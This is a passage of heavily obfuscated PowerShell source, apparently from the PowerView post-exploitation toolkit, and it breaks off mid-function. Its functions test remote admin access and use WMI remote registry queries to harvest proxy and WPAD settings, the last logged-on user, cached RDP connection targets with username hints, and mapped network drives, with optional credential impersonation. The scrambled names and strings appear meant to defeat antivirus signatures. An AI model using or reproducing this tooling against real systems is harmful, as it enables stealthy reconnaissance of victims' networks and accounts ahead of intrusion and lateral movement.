            ${hA`Nd`lE} = ${a`DVa`p`I32}::("{1}{0}{2}" -f'Manager','OpenSC','W').Invoke("\\$Computer", ("{3}{0}{1}{2}"-f 't','iv','e','ServicesAc'), 0xF003F);${l`AsT`ErroR} =   ( &("{2}{1}{0}" -f 'e','abl','varI')  ("{0}{1}"-f 'du','r8')  -VAlu  )::("{1}{0}{3}{2}"-f 'stWin','GetLa','or','32Err').Invoke()

            ${I`s`AdMiN} = &("{2}{0}{1}" -f'ew-Obj','ect','N') ("{2}{1}{0}"-f'ect','bj','PSO')
            ${Isa`dM`In} | &("{2}{0}{1}"-f'e','mber','Add-M') ("{2}{1}{3}{0}" -f'erty','pr','Note','op') ("{2}{1}{0}{3}"-f 'mputerNa','o','C','me') ${COMpu`T`Er}

            if (${haN`d`le} -ne 0) {
                ${NU`lL} = ${ADv`A`PI32}::("{4}{5}{3}{1}{0}{2}" -f'ceHa','i','ndle','v','Cl','oseSer').Invoke(${h`ANDLe})
                ${isA`DM`In} | &("{2}{0}{1}"-f'mbe','r','Add-Me') ("{3}{1}{2}{0}" -f'y','op','ert','Notepr') ("{2}{1}{0}"-f'dmin','A','Is') ${tR`Ue}
            }
            else {
                &("{0}{2}{1}{3}{4}"-f 'Write','o','-Verb','s','e') "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                ${i`s`ADmIn} | &("{2}{0}{1}"-f'dd-','Member','A') ("{1}{3}{2}{0}" -f 'ty','N','per','otepro') ("{2}{0}{1}" -f's','Admin','I') ${FAL`Se}
            }
            ${i`sadmIN}."PsO`Bj`Ect"."T`YpenAmes".("{0}{1}{2}"-f'In','se','rt').Invoke(0, ("{3}{2}{1}{0}"-f 'ess','c','nAc','PowerView.Admi'))
            ${I`Sad`MiN}
        }
    }

    END {
        if (${l`oGoNTO`Ken}) {
            &("{3}{2}{1}{4}{0}"-f 'rtToSelf','ke-R','nvo','I','eve') -TokenHandle ${LOG`oNT`OK`eN}
        }
    }
}

function Ge`T`-N`ET`co`M`pUteRsITeNAmE {
    [OutputType({"{1}{4}{3}{2}{0}"-f 'mputerSite','P','iew.Co','werV','o'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSitiON = 0, VALuefROmPipelInE = ${tr`Ue}, vALUeFRoMPIPelINeBYProPERTYNaMe = ${Tr`Ue})]
        [Alias({"{1}{0}"-f 'me','HostNa'}, {"{1}{2}{0}" -f'e','dnshostn','am'}, {"{0}{1}"-f 'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COmp`Ut`er`NAme} = ("{1}{0}{2}"-f 'os','localh','t'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`edeNTi`Al} =  (  &("{0}{1}{2}" -f'VaRiA','bl','E') ('pk'+'Fezn') )."vAl`Ue"::"Em`pTY"
    )

    BEGIN {
        if (${PS`BouNdpa`Rame`TErS}[("{1}{0}{2}" -f'reden','C','tial')]) {
            ${LOgOn`T`o`keN} = &("{6}{2}{1}{3}{4}{0}{5}"-f 'a','v','n','oke-UserI','mperson','tion','I') -Credential ${CRe`dEN`TIAL}
        }
    }

    PROCESS {
        ForEach (${c`OM`PUTeR} in ${cOm`P`Uter`NAMe}) {

            if (${C`omPU`Ter} -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                ${ipa`D`DResS} = ${co`mpUt`Er}
                ${comp`U`TeR} =   ( &("{2}{3}{1}{0}" -f 'le','B','geT','-Varia')  ('Ad'+'1') -VAlU )::("{1}{2}{0}{3}"-f'tByAddres','GetH','os','s').Invoke(${co`m`PUTEr}) | &("{2}{0}{1}" -f 'bjec','t','Select-O') -ExpandProperty ("{1}{0}" -f 'Name','Host')
            }
            else {
                ${IP`AD`dreSS} = @(&("{1}{0}{2}{3}" -f 'solve','Re','-','IPAddress') -ComputerName ${Co`MP`UTEr})[0]."IPaDdR`ess"
            }

            ${p`T`RInfO} =   ( &("{0}{2}{1}" -f 'VA','iaBlE','r') ("{1}{0}" -f'dICu','h')  -vAlUEon)::"zE`RO"

            ${rEs`Ult} = ${ne`TaP`i32}::"DS`getsI`TenAME"(${co`MP`UTEr}, [ref]${p`T`RInFo})

            ${cOm`pUTeRSI`Te} = &("{1}{0}{2}"-f 'w-Obje','Ne','ct') ("{1}{0}" -f't','PSObjec')
            ${cOmPUt`Ers`i`TE} | &("{2}{1}{0}"-f 'mber','e','Add-M') ("{3}{1}{2}{0}" -f 'operty','ep','r','Not') ("{3}{2}{0}{1}" -f'm','e','terNa','Compu') ${CO`m`PuteR}
            ${C`o`MpUt`ersite} | &("{1}{2}{3}{0}" -f'r','A','dd-Mem','be') ("{2}{0}{3}{1}"-f'pr','rty','Note','ope') ("{1}{3}{2}{0}" -f's','IP','es','Addr') ${iP`ADDR`eSS}

            if (${res`ULT} -eq 0) {
                ${si`TeNa`me} =  (&("{2}{0}{1}{3}" -f'-v','Ar','GeT','iABLe')  ("{0}{1}" -f '1t','2N') -Va)::("{0}{3}{1}{2}" -f'P','oStringAu','to','trT').Invoke(${Ptr`In`Fo})
                ${Co`m`PuT`E`RSitE} | &("{0}{2}{1}{3}" -f 'Add','mb','-Me','er') ("{0}{2}{1}" -f'No','roperty','tep') ("{1}{0}{2}" -f 'te','Si','Name') ${S`i`TenA`Me}
            }
            else {
                &("{2}{0}{1}{3}" -f 'te-','Verbo','Wri','se') "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                ${cOMpUt`er`s`Ite} | &("{2}{1}{3}{0}"-f'Member','d','Ad','-') ("{3}{0}{1}{2}" -f'rope','rt','y','Notep') ("{0}{1}{2}" -f 'S','ite','Name') ''
            }
            ${CO`mp`UT`eRsitE}."PsO`Bje`CT"."T`YP`EnAMEs".("{0}{1}" -f 'Inse','rt').Invoke(0, ("{1}{3}{0}{4}{2}"-f 'Com','Powe','Site','rView.','puter'))

            ${Nu`ll} = ${n`E`TAPi32}::("{4}{3}{1}{0}{2}" -f'er','ff','Free','ApiBu','Net').Invoke(${pTR`info})

            ${C`Omp`U`TErsItE}
        }
    }

    END {
        if (${L`o`goNt`okeN}) {
            &("{2}{3}{0}{4}{1}{5}"-f'Reve','o','Invo','ke-','rtT','Self') -TokenHandle ${LO`Gon`Tok`eN}
        }
    }
}

function Ge`T-Wm`I`Regpro`Xy {
    [OutputType({"{7}{1}{5}{2}{3}{4}{0}{6}"-f 'xy','we','w.P','r','o','rVie','Settings','Po'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSitioN = 0, vaLUefROMpIpELiNe = ${t`RuE}, VAlUefRoMPipELinebYPROPErtyNaME = ${T`Rue})]
        [Alias({"{1}{2}{0}"-f 'ame','Host','N'}, {"{2}{1}{3}{0}" -f'ame','o','dnsh','stn'}, {"{0}{1}"-f 'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cOmPuT`E`RN`AMe} = ${ENV`:CoMputE`R`NAme},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRE`dent`i`Al} =   (  &("{0}{2}{1}{3}" -f'g','i','ET-chIlD','tEm') ("{4}{3}{2}{0}{1}"-f 'E','ZN','kF','able:P','VAri'))."vAl`Ue"::"eM`PTY"
    )

    PROCESS {
        ForEach (${com`pUteR} in ${CoM`Put`ERNAmE}) {
            try {
                ${WMia`RguMen`Ts} = @{
                    ("{1}{0}"-f'ist','L') = ${T`Rue}
                    ("{0}{1}"-f 'Cl','ass') = ("{1}{2}{3}{0}" -f 'ov','StdRe','gP','r')
                    ("{1}{2}{0}"-f'e','Na','mespac') = ((("{4}{1}{0}{2}{3}"-f'fa','otl2zde','u','lt','ro'))  -repLACE'l2z',[chAR]92)
                    ("{3}{2}{1}{0}" -f'name','er','t','Compu') = ${coMP`UT`er}
                    ("{2}{1}{0}{3}"-f'rActi','ro','Er','on') = ("{1}{0}" -f'p','Sto')
                }
                if (${p`sBO`UNd`PArAMe`TErS}[("{2}{1}{0}" -f 'al','redenti','C')]) { ${wmI`ArGume`N`TS}[("{2}{0}{1}"-f'rede','ntial','C')] = ${crEDE`NT`iaL} }

                ${REg`PrO`Vid`Er} = &("{3}{0}{1}{2}"-f'miOb','j','ect','Get-W') @WmiArguments
                ${k`eY} = ((("{2}{5}{7}{4}{8}{9}{6}{12}{11}{10}{1}{0}{3}"-f'ing','Sett','SOFT','s','crosoftmzNW','WARE','V','mzNMi','indowsmzNCu','rrent','mzNInternet ','sion','er'))  -RePLace ([ChaR]109+[ChaR]122+[ChaR]78),[ChaR]92)

                ${hk`Cu} = 2147483649
                ${P`ROxysEr`Ver} = ${Re`gPRO`VI`DEr}.("{0}{2}{1}"-f 'GetStringV','lue','a').Invoke(${HK`Cu}, ${k`EY}, ("{1}{2}{0}{3}"-f 'rv','Prox','ySe','er'))."Sv`ALue"
                ${A`UTOConFI`g`UrL} = ${reg`pR`O`VIDEr}.("{0}{2}{1}" -f 'GetStri','gValue','n').Invoke(${H`kcu}, ${k`ey}, ("{3}{0}{2}{1}" -f'utoConf','URL','ig','A'))."S`VAlUE"

                ${W`PAD} = ''
                if (${aUtOco`Nf`i`Gurl} -and (${AU`T`OcO`NFig`URl} -ne '')) {
                    try {
                        ${Wp`AD} = (&("{2}{1}{0}" -f'w-Object','e','N') ("{2}{0}{1}{3}"-f'.WebClie','n','Net','t')).("{3}{0}{1}{2}"-f'oa','dStr','ing','Downl').Invoke(${aUto`C`oN`F`IguRl})
                    }
                    catch {
                        &("{1}{2}{3}{0}{4}"-f 'n','Write-Wa','rn','i','g') ('['+'Get-'+'W'+'MIRegP'+'ro'+'xy] '+'Err'+'o'+'r '+'c'+'onn'+'ectin'+'g '+'to'+' '+'AutoC'+'onfigURL'+' '+': '+"$AutoConfigURL")
                    }
                }

                if (${PROxy`se`RVer} -or ${AU`TOCOn`FIGUrL}) {
                    ${o`Ut} = &("{0}{2}{1}{3}" -f 'N','Objec','ew-','t') ("{2}{1}{0}" -f 'Object','S','P')
                    ${o`UT} | &("{2}{1}{0}"-f 'ember','M','Add-') ("{0}{1}{2}" -f 'Note','pr','operty') ("{3}{1}{2}{0}"-f 'e','puterNa','m','Com') ${C`OM`p`Uter}
                    ${o`Ut} | &("{0}{1}{2}" -f'Add-Me','mb','er') ("{1}{3}{0}{2}" -f 't','Not','y','eproper') ("{1}{2}{0}"-f'r','ProxySe','rve') ${P`RoXY`SERv`er}
                    ${O`UT} | &("{3}{1}{2}{0}" -f'ember','dd-','M','A') ("{3}{1}{0}{2}"-f 'ope','epr','rty','Not') ("{4}{1}{0}{2}{3}" -f't','u','oConfigU','RL','A') ${aU`T`OcONFig`Url}
                    ${o`Ut} | &("{0}{1}{2}"-f 'Ad','d-Me','mber') ("{1}{3}{2}{0}" -f'y','No','opert','tepr') ("{0}{1}" -f'Wp','ad') ${w`pad}
                    ${o`UT}."PsO`BjECT"."T`yPE`NAmEs".("{2}{1}{0}"-f 't','er','Ins').Invoke(0, ("{1}{5}{4}{6}{2}{3}{0}"-f'gs','Powe','i','n','w.Pro','rVie','xySett'))
                    ${O`Ut}
                }
                else {
                    &("{0}{1}{2}"-f 'Writ','e-Warnin','g') ('['+'Get-WM'+'IR'+'egProxy] '+'No'+' '+'prox'+'y'+' '+'setti'+'n'+'gs '+'fo'+'u'+'nd '+'fo'+'r '+"$ComputerName")
                }
            }
            catch {
                &("{0}{1}{2}" -f 'Write-Wa','rni','ng') ('[G'+'et-WMIR'+'egP'+'r'+'oxy'+'] '+'Er'+'ror '+'e'+'num'+'er'+'ating '+'p'+'ro'+'xy '+'se'+'tti'+'ngs'+' '+'fo'+'r '+"$ComputerName "+': '+"$_")
            }
        }
    }
}

function G`E`T-`WMir`egLASt`L`OGgedOn {
    [OutputType({"{4}{7}{6}{5}{2}{3}{1}{0}" -f'User','edOn','o','gg','Power','stL','iew.La','V'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSitioN = 0, valuEfROMPiPeLINe = ${t`RuE}, valueFrOMPipElINEBYPROpeRTYName = ${tR`UE})]
        [Alias({"{1}{2}{0}"-f 'e','Hos','tNam'}, {"{2}{0}{1}" -f'nshos','tname','d'}, {"{1}{0}"-f'e','nam'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CoMp`U`TEr`NAME} = ("{1}{0}{2}{3}"-f 'ca','lo','l','host'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRed`e`NTIAL} =  (&("{0}{1}" -f 'Di','R')  ("{1}{3}{4}{0}{2}" -f':pK','var','Fezn','I','ABLE')  )."vAL`Ue"::"eM`pty"
    )

    PROCESS {
        ForEach (${comp`Uter} in ${coM`PuTERn`Ame}) {

            ${Hk`Lm} = 2147483650

            ${WMIA`RG`Ume`NtS} = @{
                ("{0}{1}" -f'Lis','t') = ${T`RuE}
                ("{0}{1}"-f'C','lass') = ("{0}{2}{3}{1}"-f 'StdReg','ov','P','r')
                ("{1}{2}{0}{3}"-f 'ac','N','amesp','e') = ((("{4}{2}{5}{0}{1}{3}"-f 'u','l','t{0}d','t','roo','efa'))  -F [CHar]92)
                ("{1}{2}{0}"-f'name','Comput','er') = ${com`Put`eR}
                ("{2}{3}{0}{1}" -f 'ti','on','E','rrorAc') = ("{3}{2}{1}{0}{4}"-f 'u','tin','entlyCon','Sil','e')
            }
            if (${psb`o`UNd`par`AmEteRS}[("{0}{2}{1}{3}"-f 'Cre','ti','den','al')]) { ${wm`ia`RGUmEN`TS}[("{1}{0}{2}" -f'ede','Cr','ntial')] = ${C`RED`eN`TiAL} }

            try {
                ${R`EG} = &("{1}{0}{2}{3}" -f'i','Get-Wm','Objec','t') @WmiArguments

                ${k`EY} = ((("{9}{0}{1}{10}{4}{14}{11}{7}{8}{5}{13}{12}{2}{6}{3}"-f'OFTWA','R','0}Authen','{0}LogonUI','icrosoft{0','i','tication','CurrentVe','rs','S','E{0}M','s{0}','{','on','}Window'))-F  [cHar]92)
                ${V`A`lUe} = ("{2}{0}{1}"-f'a','stLoggedOnUser','L')
                ${LA`stUS`Er} = ${R`eg}.("{1}{0}{3}{4}{2}"-f 'tSt','Ge','Value','r','ing').Invoke(${H`kLM}, ${K`ey}, ${v`AluE})."SV`A`LUe"

                ${laSt`lOGg`eDon} = &("{2}{0}{1}"-f 'Objec','t','New-') ("{0}{2}{1}"-f 'P','ct','SObje')
                ${lA`STloGGe`d`on} | &("{1}{2}{0}"-f 'mber','Add-','Me') ("{0}{1}{3}{2}" -f 'N','ote','erty','prop') ("{0}{3}{2}{1}" -f 'Comp','me','terNa','u') ${c`OMp`U`TeR}
                ${l`AS`TLoGge`d`on} | &("{1}{2}{3}{0}"-f 'r','Add-','Me','mbe') ("{0}{1}{3}{2}"-f 'No','t','rty','eprope') ("{0}{3}{1}{2}"-f 'Las','ed','On','tLogg') ${lA`STUS`eR}
                ${La`St`lOGGE`dOn}."ps`O`BjECt"."TypEN`AM`es".("{1}{0}" -f 'rt','Inse').Invoke(0, ("{1}{7}{6}{5}{2}{4}{3}{0}"-f 'r','PowerV','L','ggedOnUse','o','ast','.L','iew'))
                ${la`St`loGG`EdON}
            }
            catch {
                &("{2}{1}{3}{0}" -f 'ing','rite-','W','Warn') ('[G'+'e'+'t'+'-'+'WMIReg'+'LastLoggedOn]'+' '+'E'+'rror'+' '+'openi'+'n'+'g '+'remot'+'e '+'regi'+'st'+'ry '+'o'+'n '+"$Computer. "+'R'+'e'+'mote '+'regis'+'try '+'likel'+'y '+'n'+'ot '+'ena'+'ble'+'d.')
            }
        }
    }
}

function g`ET`-`wmirEgCA`c`heDRdPC`O`NneCTiOn {
    [OutputType({"{2}{4}{5}{0}{1}{3}{6}"-f 'w.C','achedR','Pow','DPCo','e','rVie','nnection'})]
    [CmdletBinding()]
    Param(
        [Parameter(positiON = 0, VaLuEFRompipELINe = ${T`RuE}, VALuEfrOMpiPelINEBYpRopErtYnamE = ${t`RUe})]
        [Alias({"{2}{1}{0}" -f'e','ostNam','H'}, {"{2}{1}{0}"-f'e','m','dnshostna'}, {"{1}{0}"-f'ame','n'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`O`mpU`TErNaME} = ("{1}{0}{2}"-f'a','loc','lhost'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cre`d`enTIAl} =   (&("{0}{1}" -f 'vaRIaB','Le') ("{0}{1}{2}" -f'p','KF','EzN')  )."VaL`UE"::"emP`TY"
    )

    PROCESS {
        ForEach (${C`om`p`Uter} in ${coM`pUT`ErnAMe}) {

            ${h`Ku} = 2147483651

            ${WMiarG`U`mE`NTS} = @{
                ("{0}{1}" -f 'L','ist') = ${TR`UE}
                ("{0}{1}" -f 'C','lass') = ("{1}{0}{2}"-f'gPr','StdRe','ov')
                ("{1}{0}{2}" -f 'pac','Names','e') = ((("{0}{1}{2}{3}" -f 'r','oot2','PGdefaul','t'))."REpLa`cE"(([ChAr]50+[ChAr]80+[ChAr]71),'\'))
                ("{1}{3}{0}{2}" -f'te','Co','rname','mpu') = ${CoMPU`T`eR}
                ("{1}{0}{2}"-f 'rro','E','rAction') = ("{1}{0}" -f'p','Sto')
            }
            if (${pSB`OUn`dp`Ara`MeteRs}[("{2}{3}{1}{0}"-f 'al','i','Cred','ent')]) { ${w`M`i`ArGume`NtS}[("{1}{0}{2}"-f'de','Cre','ntial')] = ${c`R`edE`NtiAl} }

            try {
                ${R`eG} = &("{3}{1}{2}{0}" -f'Object','et-Wm','i','G') @WmiArguments

                ${u`SErsidS} = (${R`eg}.("{1}{0}" -f 'ey','EnumK').Invoke(${h`ku}, ''))."SN`A`MES" | &("{3}{0}{2}{1}" -f'here-','bject','O','W') { ${_} -match (('S-'+'1-5'+'-21'+'-[0-'+'9]+-['+'0'+'-9'+']+'+'-'+'[0'+'-9]+-[0-9]+{0}') -F [cHAR]36) }

                ForEach (${uSe`RSiD} in ${u`SeRS`iDs}) {
                    try {
                        if (${PsB`oUnD`PARa`mEt`Ers}[("{1}{3}{0}{2}"-f'ntia','Cr','l','ede')]) {
                            ${U`SErNA`mE} = &("{2}{1}{3}{4}{0}" -f'D','o','C','nve','rtFrom-SI') -ObjectSid ${us`Ers`Id} -Credential ${cREDeNt`I`AL}
                        }
                        else {
                            ${US`eRnAme} = &("{0}{3}{2}{1}" -f 'Convert','ID','m-S','Fro') -ObjectSid ${usE`Rsid}
                        }

                        ${Con`Ne`CTIonk`EyS} = ${R`Eg}.("{0}{2}{3}{1}"-f'Enu','ues','mV','al').Invoke(${h`Ku},("$UserSID\Software\Microsoft\Terminal "+'Ser'+'v'+'er '+('Cl'+'ient'+'V5wDefau'+'lt')."REpl`A`CE"(([CHAR]86+[CHAR]53+[CHAR]119),[STrIng][CHAR]92)))."sNa`MES"

                        ForEach (${ConNe`ct`iON} in ${c`ONnE`ct`iOnkEys}) {

                            if (${ConneC`TI`oN} -match ("{0}{1}"-f 'M','RU.*')) {
                                ${TARGe`T`sERv`eR} = ${r`Eg}.("{3}{1}{2}{0}" -f'e','ringVal','u','GetSt').Invoke(${h`kU}, ("$UserSID\Software\Microsoft\Terminal "+'Se'+'rver '+('Client'+'{0}D'+'e'+'fault')  -f [cHAR]92), ${C`O`NNeCtion})."s`Va`LuE"

                                ${FoUN`dco`NnECT`iOn} = &("{2}{1}{0}" -f 'ct','bje','New-O') ("{2}{0}{1}" -f'jec','t','PSOb')
                                ${FOUNd`c`ONnEC`TI`oN} | &("{0}{3}{2}{1}" -f'A','mber','-Me','dd') ("{2}{3}{1}{0}" -f 'y','opert','Note','pr') ("{2}{3}{0}{1}"-f'rNa','me','Co','mpute') ${CO`MP`UtER}
                                ${fou`NDconn`eC`Ti`oN} | &("{1}{2}{0}"-f 'ember','A','dd-M') ("{3}{0}{2}{1}"-f'p','rty','e','Notepro') ("{1}{0}{2}"-f'serN','U','ame') ${us`E`RnAmE}
                                ${f`OUNDCOnNE`C`TioN} | &("{1}{0}{2}{3}"-f'd','Ad','-','Member') ("{2}{3}{1}{0}" -f'operty','r','N','otep') ("{1}{2}{0}" -f'SID','Us','er') ${U`Se`RsId}
                                ${FOun`Dc`ONn`ECTION} | &("{1}{2}{0}"-f'ber','Ad','d-Mem') ("{2}{1}{0}" -f'teproperty','o','N') ("{0}{1}{2}" -f'TargetSe','rv','er') ${TarG`E`Ts`e`Rver}
                                ${FouNDc`onnE`CtION} | &("{0}{1}{2}" -f'Ad','d-Me','mber') ("{1}{2}{0}"-f'operty','Notep','r') ("{2}{3}{0}{1}"-f 'na','meHint','Us','er') ${n`UlL}
                                ${FOundC`oNn`EC`TioN}."PS`oBj`EcT"."tYP`E`NamES".("{0}{1}" -f 'Ins','ert').Invoke(0, ("{3}{6}{0}{5}{7}{1}{8}{4}{2}" -f 'rV','h','tion','Po','PConnec','iew.','we','Cac','edRD'))
                                ${f`O`UND`cONNEctI`ON}
                            }
                        }

                        ${se`RVe`Rk`eys} = ${R`Eg}.("{2}{1}{0}" -f'ey','K','Enum').Invoke(${H`Ku},("$UserSID\Software\Microsoft\Terminal "+'Server'+' '+('Clie'+'nt{'+'0}'+'Se'+'rvers')  -f [chaR]92))."sn`AMeS"

                        ForEach (${S`eRvER} in ${s`eR`VErKeys}) {

                            ${US`E`RNAm`eHINt} = ${r`eG}.("{0}{3}{2}{1}" -f'G','lue','ingVa','etStr').Invoke(${h`Ku}, ("$UserSID\Software\Microsoft\Terminal "+'S'+'e'+'rver '+"Client\Servers\$Server"), ("{3}{0}{2}{1}" -f 'se','Hint','rname','U'))."s`VaL`Ue"

                            ${fO`Undc`oNNe`cTIon} = &("{0}{1}{2}"-f'New-O','bj','ect') ("{2}{1}{0}"-f'ject','Ob','PS')
                            ${FOun`d`c`ONNecTI`oN} | &("{1}{3}{0}{2}"-f 'b','Ad','er','d-Mem') ("{2}{3}{0}{1}"-f'eprope','rty','No','t') ("{2}{0}{1}{3}" -f'u','t','Comp','erName') ${c`o`MpUtER}
                            ${fOun`d`cO`N`NEctIon} | &("{1}{2}{0}"-f 'Member','Ad','d-') ("{2}{3}{0}{1}" -f 'rop','erty','Note','p') ("{0}{2}{1}"-f 'Us','e','erNam') ${User`N`Ame}
                            ${F`ounD`COnNEct`Ion} | &("{1}{2}{0}{3}"-f'Memb','Ad','d-','er') ("{1}{0}{2}" -f'o','N','teproperty') ("{0}{1}" -f 'Us','erSID') ${uS`ErsiD}
                            ${Fou`N`DCOnne`CTiOn} | &("{0}{2}{1}" -f 'A','er','dd-Memb') ("{2}{3}{0}{1}" -f'rt','y','Not','eprope') ("{1}{3}{0}{2}" -f'erve','Targe','r','tS') ${ser`V`Er}
                            ${fOun`d`coN`NeCTIon} | &("{1}{2}{0}{3}" -f 'd','A','d','-Member') ("{3}{2}{0}{1}" -f'pert','y','otepro','N') ("{1}{0}{2}" -f 'r','Use','nameHint') ${use`R`NAmeh`INt}
                            ${F`oUNDC`ONNeCT`iON}."PSOb`J`ECT"."tY`PEn`AmES".("{1}{0}" -f 'ert','Ins').Invoke(0, ("{5}{2}{4}{1}{3}{0}"-f'ection','he','owerView.C','dRDPConn','ac','P'))
                            ${f`OUndconNec`TiOn}
                        }
                    }
                    catch {
                        &("{2}{0}{1}{3}" -f '-','Verbos','Write','e') ('[Ge'+'t'+'-WMIReg'+'CachedRDP'+'Co'+'nne'+'ctio'+'n'+'] '+'Er'+'ror:'+' '+"$_")
                    }
                }
            }
            catch {
                &("{2}{1}{3}{0}" -f 'arning','r','W','ite-W') ('[Get-W'+'MIR'+'egCachedRDPCo'+'nne'+'c'+'tion] '+'Err'+'or '+'acc'+'essing'+' '+"$Computer, "+'li'+'kely '+'insuffi'+'cie'+'n'+'t '+'perm'+'is'+'si'+'ons '+'o'+'r '+'f'+'irew'+'all '+'r'+'ules '+'o'+'n '+'hos'+'t:'+' '+"$_")
            }
        }
    }
}

function GE`T-WMireg`m`o`UnTEDDRIve {
    [OutputType({"{4}{0}{2}{5}{1}{6}{3}" -f'erVi','gMoun','ew.','e','Pow','Re','tedDriv'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSitioN = 0, vALUefroMpipElIne = ${Tr`UE}, vAlueFRoMPiPeLIneBYProPERTYName = ${t`RuE})]
        [Alias({"{2}{1}{0}"-f 'ame','tN','Hos'}, {"{2}{0}{1}" -f'nshost','name','d'}, {"{0}{1}"-f 'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${coMpU`Te`Rna`ME} = ("{0}{1}" -f 'l','ocalhost'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RE`DeNti`AL} =   (&("{1}{2}{0}" -f 'M','C','HilDITe')  ("{1}{3}{2}{0}"-f'kfEzN','vAr',':P','IAbLE')  )."V`ALUe"::"e`mPTY"
    )

    PROCESS {
        ForEach (${c`O`MPuteR} in ${C`omp`U`TErNAME}) {

            ${H`KU} = 2147483651

            ${wm`I`A`RgUMenTS} = @{
                ("{0}{1}"-f'L','ist') = ${T`Rue}
                ("{1}{0}" -f'ss','Cla') = ("{2}{1}{0}"-f 'gProv','Re','Std')
                ("{2}{1}{0}" -f'espace','m','Na') = ((("{2}{0}{1}"-f'ot4gbdef','ault','ro')) -CREPlaCe  ([CHAR]52+[CHAR]103+[CHAR]98),[CHAR]92)
                ("{2}{0}{1}"-f 'm','e','Computerna') = ${C`om`putER}
                ("{3}{2}{0}{1}"-f'io','n','ct','ErrorA') = ("{0}{1}"-f 'St','op')
            }
            if (${psboU`ND`pARA`mEteRs}[("{0}{1}{2}" -f 'C','red','ential')]) { ${w`M`IA`RguMeN`Ts}[("{1}{2}{0}"-f 'ial','Cr','edent')] = ${CRED`E`NtIal} }

            try {
                ${R`eg} = &("{2}{3}{0}{1}"-f'-Wmi','Object','Ge','t') @WmiArguments

                ${U`S`ErsiDS} = (${R`eg}.("{2}{1}{0}"-f'y','numKe','E').Invoke(${h`ku}, ''))."S`N`AMEs" | &("{2}{0}{1}" -f 'here-Objec','t','W') { ${_} -match ((('S'+'-1-5-21-[0-9]+-[0-'+'9]+-['+'0-9]'+'+'+'-['+'0-9]+79q') -cREPlAce'79q',[chAr]36)) }

                ForEach (${Us`ER`siD} in ${uSE`RSi`Ds}) {
                    try {
                        if (${pSbOu`N`DpAr`Am`ETErs}[("{2}{1}{0}" -f 'l','a','Credenti')]) {
                            ${uS`ERn`AMe} = &("{0}{3}{2}{1}"-f 'Con','m-SID','ertFro','v') -ObjectSid ${U`sER`Sid} -Credential ${C`RE`DenTIAl}
                        }
                        else {
                            ${Use`R`N`Ame} = &("{2}{1}{3}{4}{0}" -f 'D','onve','C','rtFrom-','SI') -ObjectSid ${u`serS`Id}
                        }

                        ${Dri`VE`L`e`Tters} = (${r`eG}.("{1}{0}" -f'numKey','E').Invoke(${H`kU}, "$UserSID\Network"))."sn`AmEs"

                        ForEach (${DR`IV`eleTTer} in ${D`R`I`VelEtTers}) {
                            ${Pro`VIder`NaME} = ${R`eg}.("{0}{4}{3}{1}{2}" -f'GetS','l','ue','ringVa','t').Invoke(${H`KU}, "$UserSID\Network\$DriveLetter", ("{1}{0}{2}" -f 'ro','P','viderName'))."SvAL`UE"
                            ${remO`Te`PATH} = ${r`EG}.("{1}{3}{2}{4}{0}" -f'Value','G','tri','etS','ng').Invoke(${H`KU}, "$UserSID\Network\$DriveLetter", ("{1}{2}{0}"-f'h','Rem','otePat'))."SVal`Ue"
                            ${driV`EUsE`RNAMe} = ${R`eG}.("{3}{0}{1}{2}"-f 'tStri','n','gValue','Ge').Invoke(${H`kU}, "$UserSID\Network\$DriveLetter", ("{0}{2}{1}"-f 'Us','rName','e'))."SVa`l`Ue"
                            if (-not ${u`sErNa`ME}) { ${u`Se`Rna`ME} = '' }

                            if (${Remot`ePA`Th} -and (${r`e`mO`TEPAth} -ne '')) {
                                ${M`OuN`TE`DD`RIvE} = &("{0}{1}{2}"-f'Ne','w-Obj','ect') ("{1}{0}" -f'Object','PS')
                                ${mOUn`Te`Ddr`iVe} | &("{2}{1}{0}" -f 'er','-Memb','Add') ("{3}{1}{2}{0}" -f'roperty','e','p','Not') ("{1}{0}{2}" -f 'mputerNam','Co','e') ${cO`m`Puter}
                                ${m`O`UNteD`dr`iVe} | &("{0}{2}{1}"-f'Add-','r','Membe') ("{0}{1}{3}{2}"-f 'N','otepr','erty','op') ("{0}{1}"-f'Use','rName') ${use`R`NAme}
                                ${mount`EDdr`IvE} | &("{2}{1}{0}"-f'ember','M','Add-') ("{0}{2}{1}"-f'Notepr','erty','op') ("{2}{0}{1}"-f'e','rSID','Us') ${U`SeR`siD}
                                ${M`oUn`TEddr`IVe} | &("{0}{1}{2}"-f 'Add-Me','mb','er') ("{0}{2}{3}{1}" -f 'Not','y','eprope','rt') ("{1}{0}{2}{3}" -f'veLet','Dri','t','er') ${D`RI`VeLe`TteR}
                                ${M`O`UNteDd`RivE} | &("{2}{1}{0}"-f'ember','dd-M','A') ("{1}{2}{0}{3}"-f'p','Not','epro','erty') ("{0}{2}{1}{3}"-f'Pr','Nam','ovider','e') ${P`ROvi`DERNAMe}
                                ${MoUnt`eD`dRIVe} | &("{1}{2}{0}"-f 'ber','Add','-Mem') ("{2}{1}{0}{3}"-f 'rope','p','Note','rty') ("{1}{0}{2}"-f'Pa','Remote','th') ${re`MoTEPA`Th}
                                ${m`Ou`NT`EDdrIVe} | &("{2}{1}{3}{0}"-f'er','Me','Add-','mb') ("{3}{0}{2}{1}" -f'pro','y','pert','Note') ("{3}{2}{1}{0}" -f'ame','iveUserN','r','D') ${dri`V`EuS`E`RNAME}
